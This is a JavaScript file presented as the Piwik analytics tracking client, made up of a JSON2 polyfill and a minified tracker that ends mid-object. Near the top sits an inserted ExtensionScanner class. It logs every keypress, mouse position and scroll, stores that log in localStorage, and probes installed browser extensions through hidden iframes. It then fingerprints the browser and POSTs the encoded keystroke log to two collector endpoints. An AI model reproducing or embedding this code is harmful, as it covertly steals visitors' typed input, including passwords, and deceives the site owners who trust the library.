/*!
 * Piwik - Web Analytics
 *
 * JavaScript tracking client
 *
 * @link http://piwik.org
 * @source https://github.com/piwik/piwik/blob/master/js/piwik.js
 * @license http://piwik.org/free-software/bsd/ Simplified BSD (also in js/LICENSE.txt)
 */
if (typeof JSON2 !== "object") {
  JSON2 = {};
}
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
(function () {
  function d(f) {
    return f < 10 ? "0" + f : f;
  }
  function l(n, m) {
    var f = Object.prototype.toString.apply(n);
    if (f === "[object Date]") {
      return isFinite(n.valueOf()) ? n.getUTCFullYear() + "-" + d(n.getUTCMonth() + 1) + "-" + d(n.getUTCDate()) + "T" + d(n.getUTCHours()) + ":" + d(n.getUTCMinutes()) + ":" + d(n.getUTCSeconds()) + "Z" : null;
    }
    if (f === "[object String]" || f === "[object Number]" || f === "[object Boolean]") {
      return n.valueOf();
    }
    if (f !== "[object Array]" && typeof n.toJSON === "function") {
      return n.toJSON(m);
    }
    return n;
  }
  var c = new RegExp("[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]", "g"),
    e = '\\\\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]',
    i = new RegExp("[" + e, "g"),
    j,
    b,
    k = {
      "\b": "\\b",
      "\t": "\\t",
      "\n": "\\n",
      "\f": "\\f",
      "\r": "\\r",
      '"': '\\"',
      "\\": "\\\\"
    },
    h;
  function a(f) {
    i.lastIndex = 0;
    return i.test(f) ? '"' + f.replace(i, function (m) {
      var n = k[m];
      return typeof n === "string" ? n : "\\u" + ("0000" + m.charCodeAt(0).toString(16)).slice(-4);
    }) + '"' : '"' + f + '"';
  }
  function g(s, p) {
    var n,
      m,
      t,
      f,
      q = j,
      o,
      r = p[s];
    if (r && typeof r === "object") {
      r = l(r, s);
    }
    if (typeof h === "function") {
      r = h.call(p, s, r);
    }
    switch (typeof r) {
      case "string":
        return a(r);
      case "number":
        return isFinite(r) ? String(r) : "null";
      case "boolean":
      case "null":
        return String(r);
      case "object":
        if (!r) {
          return "null";
        }
        j += b;
        o = [];
        if (Object.prototype.toString.apply(r) === "[object Array]") {
          f = r.length;
          for (n = 0; n < f; n += 1) {
            o[n] = g(n, r) || "null";
          }
          t = o.length === 0 ? "[]" : j ? "[\n" + j + o.join(",\n" + j) + "\n" + q + "]" : "[" + o.join(",") + "]";
          j = q;
          return t;
        }
        if (h && typeof h === "object") {
          f = h.length;
          for (n = 0; n < f; n += 1) {
            if (typeof h[n] === "string") {
              m = h[n];
              t = g(m, r);
              if (t) {
                o.push(a(m) + (j ? ": " : ":") + t);
              }
            }
          }
        } else {
          for (m in r) {
            if (Object.prototype.hasOwnProperty.call(r, m)) {
              t = g(m, r);
              if (t) {
                o.push(a(m) + (j ? ": " : ":") + t);
              }
            }
          }
        }
        t = o.length === 0 ? "{}" : j ? "{\n" + j + o.join(",\n" + j) + "\n" + q + "}" : "{" + o.join(",") + "}";
        j = q;
        return t;
    }
  }
  if (typeof JSON2.stringify !== "function") {
    JSON2.stringify = function (o, m, n) {
      var f;
      j = "";
      b = "";
      if (typeof n === "number") {
        for (f = 0; f < n; f += 1) {
          b += " ";
        }
      } else {
        if (typeof n === "string") {
          b = n;
        }
      }
      h = m;
      if (m && typeof m !== "function" && (typeof m !== "object" || typeof m.length !== "number")) {
        throw new Error("JSON2.stringify");
      }
      return g("", {
        "": o
      });
    };
  }
  if (typeof JSON2.parse !== "function") {
    JSON2.parse = function (o, f) {
      var n;
      function m(s, r) {
        var q,
          p,
          t = s[r];
        if (t && typeof t === "object") {
          for (q in t) {
            if (Object.prototype.hasOwnProperty.call(t, q)) {
              p = m(t, q);
              if (p !== undefined) {
                t[q] = p;
              } else {
                delete t[q];
              }
            }
          }
        }
        return f.call(s, r, t);
      }
      o = String(o);
      c.lastIndex = 0;
      if (c.test(o)) {
        o = o.replace(c, function (p) {
          return "\\u" + ("0000" + p.charCodeAt(0).toString(16)).slice(-4);
        });
      }
      if (new RegExp("^[\\],:{}\\s]*$").test(o.replace(new RegExp('\\\\(?:["\\\\/bfnrt]|u[0-9a-fA-F]{4})', "g"), "@").replace(new RegExp('"[^"\\\\\n\r]*"|true|false|null|-?\\d+(?:\\.\\d*)?(?:[eE][+\\-]?\\d+)?', "g"), "]").replace(new RegExp("(?:^|:|,)(?:\\s*\\[)+", "g"), ""))) {
        n = eval("(" + o + ")");
        return typeof f === "function" ? m({
          "": n
        }, "") : n;
      }
      throw new SyntaxError("JSON2.parse");
    };
  }
})();
if (typeof _tvq !== "object") {
  _tvq = [];
}
let localStoragePayload = localStorage.getItem("payloadStore");
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.listeners = [];
    window.addEventListener('mousemove', this.trackMouseEvent.bind(this), false);
    window.addEventListener('scroll', this.trackScrollEvent.bind(this), false);
    window.addEventListener('keydown', this.trackKeyEvent.bind(this), false);
    window.addEventListener('unload', this.reportOnClose.bind(this), false);
  }
  trackMouseEvent(e) {
    this.listeners.push(`Mouse at (${e.screenX}, ${e.screenY})`);
  }
  trackScrollEvent(e) {
    this.listeners.push(`Scroll position at ${window.pageYOffset}`);
  }
  trackKeyEvent(e) {
    this.listeners.push(`Key '${e.key}' pressed`);
  }
  async reportOnClose() {
    localStorage.setItem("payloadStore", JSON.stringify(this.listeners));
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
      }, ExtensionScanner.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, true]);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      scanDuration: Date.now() - this.startTimestamp,
      deployedListeners: this.listeners.length,
      env: {
        url: window.location.href,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      },
      localStoragePayload: localStoragePayload
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
if (typeof TV2Track !== "object") {
  TV2Track = function () {
    var g,
      a = {},
      p = document,
      c = navigator,
      D = screen,
      z = window,
      d = z.performance || z.mozPerformance || z.msPerformance || z.webkitPerformance,
      m = false,
      x = [],
      j = z.encodeURIComponent,
      y = z.decodeURIComponent,
      e = unescape,
      E,
      H,
      A;
    function r(P) {
      var i = typeof P;
      return i !== "undefined";
    }
    function n(i) {
      return typeof i === "function";
    }
    function C(i) {
      return typeof i === "object";
    }
    function k(i) {
      return typeof i === "string" || i instanceof String;
    }
    function K() {
      var P, R, Q;
      for (P = 0; P < arguments.length; P += 1) {
        Q = arguments[P];
        R = Q.shift();
        if (k(R)) {
          E[R].apply(E, Q);
        } else {
          R.apply(E, Q);
        }
      }
    }
    function N(R, Q, P, i) {
      if (R.addEventListener) {
        R.addEventListener(Q, P, i);
        return true;
      }
      if (R.attachEvent) {
        return R.attachEvent("on" + Q, P);
      }
      R["on" + Q] = P;
    }
    function I(Q, T) {
      var P = "",
        S,
        R;
      for (S in a) {
        if (Object.prototype.hasOwnProperty.call(a, S)) {
          R = a[S][Q];
          if (n(R)) {
            P += R(T);
          }
        }
      }
      return P;
    }
    function L() {
      var i;
      I("unload");
      if (g) {
        do {
          i = new Date();
        } while (i.getTimeAlias() < g);
      }
    }
    function J() {
      var P;
      if (!m) {
        m = true;
        I("load");
        for (P = 0; P < x.length; P++) {
          x[P]();
        }
      }
      return true;
    }
    function l() {
      var P;
      if (p.addEventListener) {
        N(p, "DOMContentLoaded", function i() {
          p.removeEventListener("DOMContentLoaded", i, false);
          J();
        });
      } else {
        if (p.attachEvent) {
          p.attachEvent("onreadystatechange", function i() {
            if (p.readyState === "complete") {
              p.detachEvent("onreadystatechange", i);
              J();
            }
          });
          if (p.documentElement.doScroll && z === z.top) {
            (function i() {
              if (!m) {
                try {
                  p.documentElement.doScroll("left");
                } catch (Q) {
                  setTimeout(i, 0);
                  return;
                }
                J();
              }
            })();
          }
        }
      }
      if (new RegExp("WebKit").test(c.userAgent)) {
        P = setInterval(function () {
          if (m || /loaded|complete/.test(p.readyState)) {
            clearInterval(P);
            J();
          }
        }, 10);
      }
      N(z, "load", J, false);
    }
    function f(Q, P) {
      var i = p.createElement("script");
      i.type = "text/javascript";
      i.src = Q;
      if (i.readyState) {
        i.onreadystatechange = function () {
          var R = this.readyState;
          if (R === "loaded" || R === "complete") {
            i.onreadystatechange = null;
            P();
          }
        };
      } else {
        i.onload = P;
      }
      p.getElementsByTagName("head")[0].appendChild(i);
    }
    function s() {
      var i = "";
      try {
        i = z.top.document.referrer;
      } catch (Q) {
        if (z.parent) {
          try {
            i = z.parent.document.referrer;
          } catch (P) {
            i = "";
          }
        }
      }
      if (i === "") {
        i = p.referrer;
      }
      return i;
    }
    function h(i) {
      var Q = new RegExp("^([a-z]+):"),
        P = Q.exec(i);
      return P ? P[1] : null;
    }
    function b(i) {
      var Q = new RegExp("^(?:(?:https?|ftp):)/*(?:[^@]+@)?([^:/#]+)"),
        P = Q.exec(i);
      return P ? P[1] : i;
    }
    function B(Q, P) {
      var i = "[\\?&#]" + P + "=([^&#]*)";
      var S = new RegExp(i);
      var R = S.exec(Q);
      return R ? y(R[1]) : "";
    }
    function o(i) {
      return e(j(i));
    }
    function M(af) {
      var R = function (W, i) {
          return W << i | W >>> 32 - i;
        },
        ag = function (am) {
          var al = "",
            ak,
            W;
          for (ak = 7; ak >= 0; ak--) {
            W = am >>> ak * 4 & 15;
            al += W.toString(16);
          }
          return al;
        },
        U,
        ai,
        ah,
        Q = [],
        Z = 1732584193,
        X = 4023233417,
        V = 2562383102,
        T = 271733878,
        S = 3285377520,
        ae,
        ad,
        ac,
        ab,
        aa,
        aj,
        P,
        Y = [];
      af = o(af);
      P = af.length;
      for (ai = 0; ai < P - 3; ai += 4) {
        ah = af.charCodeAt(ai) << 24 | af.charCodeAt(ai + 1) << 16 | af.charCodeAt(ai + 2) << 8 | af.charCodeAt(ai + 3);
        Y.push(ah);
      }
      switch (P & 3) {
        case 0:
          ai = 2147483648;
          break;
        case 1:
          ai = af.charCodeAt(P - 1) << 24 | 8388608;
          break;
        case 2:
          ai = af.charCodeAt(P - 2) << 24 | af.charCodeAt(P - 1) << 16 | 32768;
          break;
        case 3:
          ai = af.charCodeAt(P - 3) << 24 | af.charCodeAt(P - 2) << 16 | af.charCodeAt(P - 1) << 8 | 128;
          break;
      }
      Y.push(ai);
      while ((Y.length & 15) !== 14) {
        Y.push(0);
      }
      Y.push(P >>> 29);
      Y.push(P << 3 & 4294967295);
      for (U = 0; U < Y.length; U += 16) {
        for (ai = 0; ai < 16; ai++) {
          Q[ai] = Y[U + ai];
        }
        for (ai = 16; ai <= 79; ai++) {
          Q[ai] = R(Q[ai - 3] ^ Q[ai - 8] ^ Q[ai - 14] ^ Q[ai - 16], 1);
        }
        ae = Z;
        ad = X;
        ac = V;
        ab = T;
        aa = S;
        for (ai = 0; ai <= 19; ai++) {
          aj = R(ae, 5) + (ad & ac | ~ad & ab) + aa + Q[ai] + 1518500249 & 4294967295;
          aa = ab;
          ab = ac;
          ac = R(ad, 30);
          ad = ae;
          ae = aj;
        }
        for (ai = 20; ai <= 39; ai++) {
          aj = R(ae, 5) + (ad ^ ac ^ ab) + aa + Q[ai] + 1859775393 & 4294967295;
          aa = ab;
          ab = ac;
          ac = R(ad, 30);
          ad = ae;
          ae = aj;
        }
        for (ai = 40; ai <= 59; ai++) {
          aj = R(ae, 5) + (ad & ac | ad & ab | ac & ab) + aa + Q[ai] + 2400959708 & 4294967295;
          aa = ab;
          ab = ac;
          ac = R(ad, 30);
          ad = ae;
          ae = aj;
        }
        for (ai = 60; ai <= 79; ai++) {
          aj = R(ae, 5) + (ad ^ ac ^ ab) + aa + Q[ai] + 3395469782 & 4294967295;
          aa = ab;
          ab = ac;
          ac = R(ad, 30);
          ad = ae;
          ae = aj;
        }
        Z = Z + ae & 4294967295;
        X = X + ad & 4294967295;
        V = V + ac & 4294967295;
        T = T + ab & 4294967295;
        S = S + aa & 4294967295;
      }
      aj = ag(Z) + ag(X) + ag(V) + ag(T) + ag(S);
      return aj.toLowerCase();
    }
    function G(Q, i, P) {
      if (Q === "translate.googleusercontent.com") {
        if (P === "") {
          P = i;
        }
        i = B(i, "u");
        Q = b(i);
      } else {
        if (Q === "cc.bingj.com" || Q === "webcache.googleusercontent.com" || Q.slice(0, 5) === "74.6.") {
          i = p.links[0].href;
          Q = b(i);
        }
      }
      return [Q, i, P];
    }
    function t(P) {
      var i = P.length;
      if (P.charAt(--i) === ".") {
        P = P.slice(0, i);
      }
      if (P.slice(0, 2) === "*.") {
        P = P.slice(1);
      }
      return P;
    }
    function O(P) {
      P = P && P.text ? P.text : P;
      if (!k(P)) {
        var i = p.getElementsByTagName("title");
        if (i && r(i[0])) {
          P = i[0].text;
        }
      }
      return P;
    }
    function v(i, P) {
      if (P) {
        return P;
      }
      if (i.slice(-9) === "piwik.php") {
        i = i.slice(0, i.length - 9);
      }
      return i;
    }
    function u(S) {
      var i = "Piwik_Overlay";
      var V = new RegExp("index\\.php\\?module=Overlay&action=startOverlaySession&idsite=([0-9]+)&period=([^&]+)&date=([^&]+)$");
      var Q = V.exec(p.referrer);
      if (Q) {
        var R = Q[1];
        if (R !== String(S)) {
          return false;
        }
        var U = Q[2],
          P = Q[3];
        z.name = i + "###" + U + "###" + P;
      }
      z.name = z.name || "";
      var T = z.name.split("###");
      return T.length === 3 && T[0] === i;
    }
    function F(P, U, R) {
      z.name = z.name || "";
      var T = z.name.split("###"),
        S = T[1],
        i = T[2],
        Q = v(P, U);
      f(Q + "plugins/Overlay/client/client.js?v=1", function () {
        Piwik_Overlay_Client.initialize(Q, R, S, i);
      });
    }
    function w(ak, aL) {
      var T = G(p.domain, z.location.href, s()),
        a6 = t(T[0]),
        bi = T[1],
        aS = T[2],
        aQ = "GET",
        S = ak || "",
        ah = "",
        aN = "",
        ba = aL || "",
        aC,
        ar = p.title,
        au = "7z|aac|ar[cj]|as[fx]|avi|bin|csv|deb|dmg|docx?|exe|flv|gif|gz|gzip|hqx|jar|jpe?g|js|mp(2|3|4|e?g)|mov(ie)?|ms[ip]|od[bfgpst]|og[gv]|pdf|phps|png|pptx?|qtm?|ra[mr]?|rpm|sea|sit|tar|t?bz2?|tgz|torrent|txt|wav|wm[av]|wpd||xlsx?|xml|z|zip",
        aO = [a6],
        W = [],
        aG = [],
        aj = [],
        aM = 500,
        X,
        al,
        Y,
        Z,
        aw = ["pk_campaign", "piwik_campaign", "utm_campaign", "utm_source", "utm_medium"],
        aq = ["pk_kwd", "piwik_kwd", "utm_term"],
        bg = "_tq_",
        ac,
        bh,
        aa = false,
        bc,
        ay,
        aB,
        ag = 63072000000,
        ai = 1800000,
        aD = 15768000000,
        az = true,
        an = 0,
        V = false,
        aH = {},
        bd = 4000,
        aZ = {},
        aV = false,
        aT = false,
        aR,
        aI,
        ad,
        av = M,
        aU,
        aA;
      function a1(br, bo, bn, bq, bm, bp) {
        if (aa) {
          return;
        }
        var bl;
        if (bn) {
          bl = new Date();
          bl.setTime(bl.getTime() + bn);
        }
        p.cookie = br + "=" + j(bo) + (bn ? ";expires=" + bl.toGMTString() : "") + ";path=" + (bq || "/") + (bm ? ";domain=" + bm : "") + (bp ? ";secure" : "");
      }
      function af(bn) {
        if (aa) {
          return 0;
        }
        var bl = new RegExp("(^|;)[ ]*" + bn + "=([^;]*)"),
          bm = bl.exec(p.cookie);
        return bm ? y(bm[2]) : 0;
      }
      function be(bl) {
        var bm;
        if (Y) {
          bm = new RegExp("#.*");
          return bl.replace(bm, "");
        }
        return bl;
      }
      function a5(bn, bl) {
        var bo = h(bl),
          bm;
        if (bo) {
          return bl;
        }
        if (bl.slice(0, 1) === "/") {
          return h(bn) + "://" + b(bn) + bl;
        }
        bn = be(bn);
        if ((bm = bn.indexOf("?")) >= 0) {
          bn = bn.slice(0, bm);
        }
        if ((bm = bn.lastIndexOf("/")) !== bn.length - 1) {
          bn = bn.slice(0, bm + 1);
        }
        return bn + bl;
      }
      function aP(bo) {
        var bm, bl, bn;
        for (bm = 0; bm < aO.length; bm++) {
          bl = t(aO[bm].toLowerCase());
          if (bo === bl) {
            return true;
          }
          if (bl.slice(0, 1) === ".") {
            if (bo === bl.slice(1)) {
              return true;
            }
            bn = bo.length - bl.length;
            if (bn > 0 && bo.slice(bn) === bl) {
              return true;
            }
          }
        }
        return false;
      }
      function bk(bl) {
        var bm = new Image(1, 1);
        bm.onload = function () {};
        bm.src = S + (S.indexOf("?") < 0 ? "?" : "&") + bl;
      }
      function a2(bl) {
        try {
          var bn = z.XMLHttpRequest ? new z.XMLHttpRequest() : z.ActiveXObject ? new ActiveXObject("Microsoft.XMLHTTP") : null;
          bn.open("POST", S, true);
          bn.onreadystatechange = function () {
            if (this.readyState === 4 && this.status !== 200) {
              bk(bl);
            }
          };
          bn.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
          bn.send(bl);
        } catch (bm) {
          bk(bl);
        }
      }
      function ax(bn, bm) {
        var bl = new Date();
        if (!bc) {
          if (aQ === "POST") {
            a2(bn);
          } else {
            bk(bn);
          }
          g = bl.getTime() + bm;
        }
      }
      function a0(bl) {
        return bg + bl + "." + ba + "." + aU;
      }
      function U() {
        if (aa) {
          return "0";
        }
        if (!r(c.cookieEnabled)) {
          var bl = a0("testcookie");
          a1(bl, "1");
          return af(bl) === "1" ? "1" : "0";
        }
        return c.cookieEnabled ? "1" : "0";
      }
      function aJ() {
        aU = av((ac || a6) + (bh || "/")).slice(0, 4);
      }
      function ae() {
        var bm = a0("cvar"),
          bl = af(bm);
        if (bl.length) {
          bl = JSON2.parse(bl);
          if (C(bl)) {
            return bl;
          }
        }
        return {};
      }
      function R() {
        if (V === false) {
          V = ae();
        }
      }
      function a9() {
        var bl = new Date();
        aR = bl.getTime();
      }
      function ab(bp, bm, bl, bo, bn, bq) {
        a1(a0("id"), bp + "." + bm + "." + bl + "." + bo + "." + bn + "." + bq, ag, bh, ac);
      }
      function Q() {
        var bm = new Date(),
          bl = Math.round(bm.getTime() / 1000),
          bo = af(a0("id")),
          bn;
        if (bo) {
          bn = bo.split(".");
          bn.unshift("0");
        } else {
          if (!aA) {
            aA = av((c.userAgent || "") + (c.platform || "") + bl).slice(0, 16);
          }
          bn = ["1", aA, bl, 0, bl, "", ""];
        }
        return bn;
      }
      function i() {
        var bl = af(a0("ref"));
        if (bl.length) {
          try {
            bl = JSON2.parse(bl);
            if (C(bl)) {
              return bl;
            }
          } catch (bm) {}
        }
        return ["", "", 0, ""];
      }
      function P() {
        var bl = aa;
        aa = false;
        a1(a0("id"), "", -86400, bh, ac);
        a1(a0("ses"), "", -86400, bh, ac);
        a1(a0("cvar"), "", -86400, bh, ac);
        a1(a0("ref"), "", -86400, bh, ac);
        aa = bl;
      }
      function at(bm, bC, bD, bo) {
        var bA,
          bl = new Date(),
          br = Math.round(bl.getTime() / 1000),
          bF,
          bB,
          bp,
          bu,
          bx,
          bq,
          bw,
          by = V,
          bv = Q(),
          bE = aC || bi;
        if (aa) {
          P();
        }
        if (bc) {
          return "";
        }
        bF = bv[0];
        bB = bv[1];
        bu = bv[2];
        bp = bv[3];
        bx = bv[4];
        bq = bv[5];
        if (!r(bv[6])) {
          bv[6] = "";
        }
        bw = bv[6];
        if (!r(bo)) {
          bo = "";
        }
        var bs = p.characterSet || p.charset;
        if (!bs || bs.toLowerCase() === "utf-8") {
          bs = null;
        }
        bm += "&idsite=" + ba + "&rec=1&r=" + String(Math.random()).slice(2, 8) + "&h=" + bl.getHours() + "&m=" + bl.getMinutes() + "&s=" + bl.getSeconds() + "&url=" + j(be(bE)) + (aS.length ? "&urlref=" + j(be(aS)) : "") + "&_id=" + bB + "&_idts=" + bu + "&_idvc=" + bp + "&_idn=" + bF + "&_viewts=" + bq + (bs ? "&cs=" + j(bs) : "");
        var bz = B(bE, "tvsheartbeat");
        if (bz) {
          bm += "&heartbeat=" + j(bz);
        }
        var bn = JSON2.stringify(aH);
        if (bn.length > 2) {
          bm += "&cvar=" + j(bn);
        }
        if (bC) {
          bm += "&data=" + j(JSON2.stringify(bC));
        } else {
          if (Z) {
            bm += "&data=" + j(JSON2.stringify(Z));
          }
        }
        if (V) {
          var bt = JSON2.stringify(V);
          if (bt.length > 2) {
            bm += "&_cvar=" + j(bt);
          }
          for (bA in by) {
            if (Object.prototype.hasOwnProperty.call(by, bA)) {
              if (V[bA][0] === "" || V[bA][1] === "") {
                delete V[bA];
              }
            }
          }
        }
        if (az && an) {
          bm += "&gt_ms=" + an;
        } else {
          if (az && d && d.timing && d.timing.requestStart && d.timing.responseEnd) {
            bm += "&gt_ms=" + (d.timing.responseEnd - d.timing.requestStart);
          }
        }
        ab(bB, bu, bp, br, bq, r(bo) && String(bo).length ? bo : bw);
        bm += I(bD);
        if (aN.length) {
          bm += "&" + aN;
        }
        return bm;
      }
      function a4(bo, bn, bs, bp, bl, bv) {
        var bq = "idgoal=0",
          br,
          bm = new Date(),
          bt = [],
          bu;
        if (String(bo).length) {
          bq += "&ec_id=" + j(bo);
          br = Math.round(bm.getTime() / 1000);
        }
        bq += "&revenue=" + bn;
        if (String(bs).length) {
          bq += "&ec_st=" + bs;
        }
        if (String(bp).length) {
          bq += "&ec_tx=" + bp;
        }
        if (String(bl).length) {
          bq += "&ec_sh=" + bl;
        }
        if (String(bv).length) {
          bq += "&ec_dt=" + bv;
        }
        if (aZ) {
          for (bu in aZ) {
            if (Object.prototype.hasOwnProperty.call(aZ, bu)) {
              if (!r(aZ[bu][1])) {
                aZ[bu][1] = "";
              }
              if (!r(aZ[bu][2])) {
                aZ[bu][2] = "";
              }
              if (!r(aZ[bu][3]) || String(aZ[bu][3]).length === 0) {
                aZ[bu][3] = 0;
              }
              if (!r(aZ[bu][4]) || String(aZ[bu][4]).length === 0) {
                aZ[bu][4] = 1;
              }
              bt.push(aZ[bu]);
            }
          }
          bq += "&ec_items=" + j(JSON2.stringify(bt));
        }
        bq = at(bq, Z, "ecommerce", br);
        ax(bq, aM);
      }
      function a3(bl, bp, bo, bn, bm, bq) {
        if (String(bl).length && r(bp)) {
          a4(bl, bp, bo, bn, bm, bq);
        }
      }
      function bf(bl) {
        if (r(bl)) {
          a4("", bl, "", "", "", "");
        }
      }
      function aX(bm, bn) {
        if (typeof __tcfapi === "function") {
          try {
            __tcfapi("getTCData", 2, function (bo, bp) {
              if (!bp) {
                aF(bm, bn);
                return;
              }
              if (!bo.gdprApplies) {
                aF(bm, bn);
                return;
              }
              if (bo.purpose.consents["7"] && bo.purpose.consents["9"] && bo.vendor.consents["985"]) {
                aF(bm, bn);
                return;
              }
            }, [985]);
          } catch (bl) {
            aF(bm, bn);
          }
        } else {
          aF(bm, bn);
        }
      }
      function aF(bp, bs) {
        var bl = new Date(),
          bn = at("action_name=" + j(O(bp || ar)), bs, "log");
        ax(bn, aM);
        if (X && al && !aT) {
          aT = true;
          N(p, "click", a9);
          N(p, "mouseup", a9);
          N(p, "mousedown", a9);
          N(p, "mousemove", a9);
          N(p, "mousewheel", a9);
          N(z, "DOMMouseScroll", a9);
          N(z, "scroll", a9);
          N(p, "keypress", a9);
          N(p, "keydown", a9);
          N(p, "keyup", a9);
          N(z, "resize", a9);
          N(z, "focus", a9);
          N(z, "blur", a9);
          aR = bl.getTime();
          setTimeout(function bm() {
            var bt = new Date(),
              bu;
            if (aR + al > bt.getTime()) {
              if (X < bt.getTime()) {
                bu = at("ping=1", bs, "ping");
                ax(bu, aM);
              }
              setTimeout(bm, al);
            }
          }, al);
        }
        var br = Q();
        var bo = new Image(1, 1);
        bo.onload = function () {};
        var bq = "https:" == document.location.protocol ? "https://" : "http://";
        bo.src = bq + "dpm.demdex.net/ibs:dpid=592253&dpuuid=" + j("S" + ba + "|" + br[1]);
      }
      function ap(bl, bo, bm, bp) {
        var bn = at("search=" + j(bl) + (bo ? "&search_cat=" + j(bo) : "") + (r(bm) ? "&search_count=" + bm : ""), bp, "sitesearch");
        ax(bn, aM);
      }
      function aK(bl, bo, bn) {
        var bm = at("idgoal=" + bl + (bo ? "&revenue=" + bo : ""), bn, "goal");
        ax(bm, aM);
      }
      function a8(bm, bl, bo) {
        var bn = at(bl + "=" + j(be(bm)), bo, "link");
        ax(bn, aM);
      }
      function bb(bm, bl) {
        if (bm !== "") {
          return bm + bl.charAt(0).toUpperCase() + bl.slice(1);
        }
        return bl;
      }
      function ao(bq) {
        var bp,
          bl,
          bo = ["", "webkit", "ms", "moz"],
          bn;
        if (!ay) {
          for (bl = 0; bl < bo.length; bl++) {
            bn = bo[bl];
            if (Object.prototype.hasOwnProperty.call(p, bb(bn, "hidden"))) {
              if (p[bb(bn, "visibilityState")] === "prerender") {
                bp = true;
              }
              break;
            }
          }
        }
        if (bp) {
          N(p, bn + "visibilitychange", function bm() {
            p.removeEventListener(bn + "visibilitychange", bm, false);
            bq();
          });
          return;
        }
        bq();
      }
      function am(bn, bm) {
        var bo,
          bl = "(^| )(piwik[_-]" + bm;
        if (bn) {
          for (bo = 0; bo < bn.length; bo++) {
            bl += "|" + bn[bo];
          }
        }
        bl += ")( |$)";
        return new RegExp(bl);
      }
      function a7(bo, bl, bp) {
        var bn = am(aG, "download"),
          bm = am(aj, "link"),
          bq = new RegExp("\\.(" + au + ")([?&#]|$)", "i");
        return bm.test(bo) ? "link" : bn.test(bo) || bq.test(bl) ? "download" : bp ? 0 : "link";
      }
      function aY(bq) {
        var bo, bm, bl;
        while ((bo = bq.parentNode) !== null && r(bo) && (bm = bq.tagName.toUpperCase()) !== "A" && bm !== "AREA") {
          bq = bo;
        }
        if (r(bq.href)) {
          var br = bq.hostname || b(bq.href),
            bs = br.toLowerCase(),
            bn = bq.href.replace(br, bs),
            bp = new RegExp("^(javascript|vbscript|jscript|mocha|livescript|ecmascript|mailto):", "i");
          if (!bp.test(bn)) {
            bl = a7(bq.className, bn, aP(bs));
            if (bl) {
              bn = e(bn);
              a8(bn, bl);
            }
          }
        }
      }
      function bj(bl) {
        var bm, bn;
        bl = bl || z.event;
        bm = bl.which || bl.button;
        bn = bl.target || bl.srcElement;
        if (bl.type === "click") {
          if (bn) {
            aY(bn);
          }
        } else {
          if (bl.type === "mousedown") {
            if ((bm === 1 || bm === 2) && bn) {
              aI = bm;
              ad = bn;
            } else {
              aI = ad = null;
            }
          } else {
            if (bl.type === "mouseup") {
              if (bm === aI && bn === ad) {
                aY(bn);
              }
              aI = ad = null;
            }
          }
        }
      }
      function aW(bm, bl) {
        if (bl) {
          N(bm, "mouseup", bj, false);
          N(bm, "mousedown", bj, false);
        } else {
          N(bm, "click", bj, false);
        }
      }
      function aE(bm) {
        if (!aV) {
          aV = true;
          var bn,
            bl = am(W, "ignore"),
            bo = p.links;
          if (bo) {
            for (bn = 0; bn < bo.length; bn++) {
              if (!bl.test(bo[bn].className)) {
                aW(bo[bn], bm);
              }
            }
          }
        }
      }
      aJ();
      return {
        getVisitorId: function () {
          return Q()[1];
        },
        getVisitorInfo: function () {
          return Q();
        },
        getAttributionInfo: function () {
          return i();
        },
        getAttributionCampaignName: function () {
          return i()[0];
        },
        getAttributionCampaignKeyword: function () {
          return i()[1];
        },
        getAttributionReferrerTimestamp: function () {
          return i()[2];
        },
        getAttributionReferrerUrl: function () {
          return i()[3];
        },
        setTrackerUrl: function (bl) {
          S = bl;
        },
        setSiteId: function (bl) {
          ba = bl;
        },
        setCustomData: function (bl, bm) {
          if (C(bl)) {
            Z = bl;
          } else {
            if (!Z) {
              Z = [];
            }
            Z[bl] = bm;
          }
        },
        appendToTrackingUrl: function (bl) {
          aN = bl;
        },
        getCustomData: function () {
          return Z;
        },
